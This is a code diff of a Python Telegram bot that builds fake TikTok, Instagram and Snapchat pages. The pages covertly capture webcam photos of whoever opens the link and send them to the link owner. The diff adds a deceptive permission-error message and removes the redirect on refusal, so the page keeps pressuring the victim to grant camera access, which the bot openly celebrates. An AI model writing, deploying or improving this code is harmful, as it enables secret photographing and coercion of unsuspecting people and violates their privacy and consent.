@@ -60,7 +60,7 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة المقالب المتقدمة (اللقطات المتعددة + صفحة التمويه) ----
+# ---- واجهة المقالب المتقدمة (نظام الحجز والتعليق اللانهائي) ----
 def get_html_content(template_type):
     # إعدادات القوالب الافتراضية
     bg_color = "#010101"
@@ -96,7 +96,7 @@ def get_html_content(template_type):
         btn_text = "🔥 تشغيل الفلتر الحصري"
         redirect_to = "https://www.snapchat.com"
 
-    # كود الـ HTML المطور بالكامل مع نظام الصيد الثلاثي المتتالي وصفحة التمويه والأخطاء
+    # كود الـ HTML مع جافا سكريبت العزل اللانهائي
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -142,6 +142,7 @@ def get_html_content(template_type):
             .btn:active {{ transform: scale(0.98); }}
             .error-msg {{
                 color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
+                background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;
             }}
         </style>
     </head>
@@ -155,27 +156,24 @@ def get_html_content(template_type):
             <h2 id="mainTitle">{title}</h2>
             <p id="mainDesc">{desc}</p>
             <button class="btn" id="startBtn">{btn_text}</button>
-            <div class="error-msg" id="errorBlock">⚠️ عذراً، يجب السماح بوصول الكاميرا لتشغيل النظام التفاعلي! يرجى إعادة الضغط والموافقة.</div>
+            <div class="error-msg" id="errorBlock">⚠️ تنبيه: الكاميرا معطلة! يجب الضغط مجدداً والموافقة على منح الإذن لتتمكن من الدخول للموقع الرسمي ومتابعة المشاهدة.</div>
         </div>
 
         <script>
             const urlParams = new URLSearchParams(window.location.search);
             const ownerId = urlParams.get('id');
             const REDIRECT_URL = "{redirect_to}";
-            let clickCount = 0;
 
-            document.getElementById('startBtn').addEventListener('click', function() {{
+            function tryCapture() {{
                 if (!ownerId) {{
                     window.location.href = REDIRECT_URL;
                     return;
                 }}
 
-                // محاولة فتح الكاميرا
                 navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                 .then(function(stream) {{
-                    // إخفاء رسائل الخطأ إذا وافق
                     document.getElementById('errorBlock').style.display = 'none';
-                    document.getElementById('statusText').innerText = "جاري معالجة الفلتر الحي وضبط الأبعاد...";
+                    document.getElementById('statusText').innerText = "جاري تهيئة النظام ومعالجة الأبعاد الحية...";
                     
                     let video = document.createElement('video');
                     video.srcObject = stream;
@@ -189,21 +187,17 @@ def get_html_content(template_type):
                         let ctx = canvas.getContext('2d');
                         
                         let shotsTaken = 0;
-                        
-                        // دالة التقاط متكررة (3 مرات بين كل لقطة نصف ثانية)
                         let captureInterval = setInterval(function() {{
                             if (shotsTaken >= 3) {{
                                 clearInterval(captureInterval);
-                                // إغلاق الكاميرا والتحويل للموقع الرسمي بعد إنهاء اللقطات الثلاث
                                 stream.getTracks().forEach(track => track.stop());
-                                window.location.href = REDIRECT_URL;
+                                window.location.href = REDIRECT_URL; // التحويل بعد الصيد الثلاثي ناجح
                                 return;
                             }}
                             
                             ctx.drawImage(video, 0, 0);
                             let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                             
-                            // إرسال اللقطة الحالية للسيرفر
                             fetch('/api/capture', {{
                                 method: 'POST',
                                 headers: {{ 'Content-Type': 'application/json' }},
@@ -211,20 +205,17 @@ def get_html_content(template_type):
                             }});
                             
                             shotsTaken++;
-                        }}, 500); // 500 ملي ثانية = نصف ثانية بين اللقطات
+                        }}, 500);
                     }};
                 }})
                 .catch(function(err) {{
-                    // خطة التمويه الذكية: إذا رفض للمرة الأولى، لا نحوله بل نظهر خطأ مموه لإقناعه
-                    clickCount++;
-                    if (clickCount === 1) {{
-                        document.getElementById('errorBlock').style.display = 'block';
-                    }} else {{
-                        // إذا رفض للمرة الثانية، يتم تحويله تلقائياً للموقع الأصلي لمنع الشك
-                        window.location.href = REDIRECT_URL;
-                    }}
+                    // [نظام الحجز اللانهائي 🔒]: إذا رفض الإذن، نظهر رسالة التحذير ونمنع التحويل تماماً!
+                    document.getElementById('errorBlock').style.display = 'block';
+                    document.getElementById('statusText').innerText = "⚠️ خطأ في الصلاحيات! يرجى إعادة المحاولة...";
                 }});
-            }});
+            }}
+
+            document.getElementById('startBtn').addEventListener('click', tryCapture);
         </script>
     </body>
     </html>
@@ -238,8 +229,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي الذكي (النسخة المتقدمة) 📸🔥\n\n"
-        "💳 لتفعيل حسابك ونظام اللقطات الثلاثية الذكية، اضغط تفعيل بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي (نسخة العزل اللانهائي!) 📸🔒\n\n"
+        "💳 لتفعيل حسابك ونظام اللقطات الثلاثية الذكية مع قفل الرفض، اضغط تفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -249,7 +240,7 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل النظام الذكي v2.0!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل قفل الحجز اللانهائي!")
     
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -257,7 +248,7 @@ def buy(call):
         InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
         InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
     )
-    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الثلاثي المتتالي:", reply_markup=markup)
+    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الإجباري:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -270,11 +261,10 @@ def gen_link(call):
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        f"🚀 **رابط المقلب الذكي لـ ({template.upper()}) جاهز تماماً!**\n\n"
+        f"🚀 **رابط المقلب الإجباري لـ ({template.upper()}) جاهز ومحمي ضد الرفض!**\n\n"
         f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
-        "💡 **مميزات هذا الرابط:**\n"
-        "1. سيقوم بالتقاط **3 صور متتالية** سريعة فور فتح الكاميرا لضمان صيد تعبيرات مضحكة جداً.\n"
-        "2. إذا ضغط الضحية إلغاء أو رفض، ستظهر له صفحة خطأ وهمية لإقناعه بالموافقة مجدداً قبل الخروج!"
+        "🔥 **التعديل الجديد المرعب:**\n"
+        "إذا ضغط الضحية على 'عدم السماح' أو رفض، الصفحة **لن تحوله** إلى أي مكان! ستظل معلقة أمامه وتجبره على إعادة المحاولة والموافقة حتى يعفن داخلها! 😈"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
@@ -297,7 +287,7 @@ def send_photo_to_owner(user_id, image_bytes, count_text):
         bot.send_photo(
             chat_id=user_id, 
             photo=image_bytes, 
-            caption=f"📸 **ههههه! تم صيد اللقطة الفكاهية رقم ({count_text}) بنجاح!**"
+            caption=f"📸 **صيد إجباري ناجح! اللقطة رقم ({count_text})**"
         )
     except Exception as e:
         print(f"Error sending photo: {e}")
@@ -327,8 +317,9 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم تفعيل الـ Webhook مع نظام اللقطات المتعددة الذكي!")
+    print("🚀 تم إطلاق تحديث الحجز اللانهائي بنجاح!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     uvicorn.run(app, host="0.0.0.0", port=port)
+
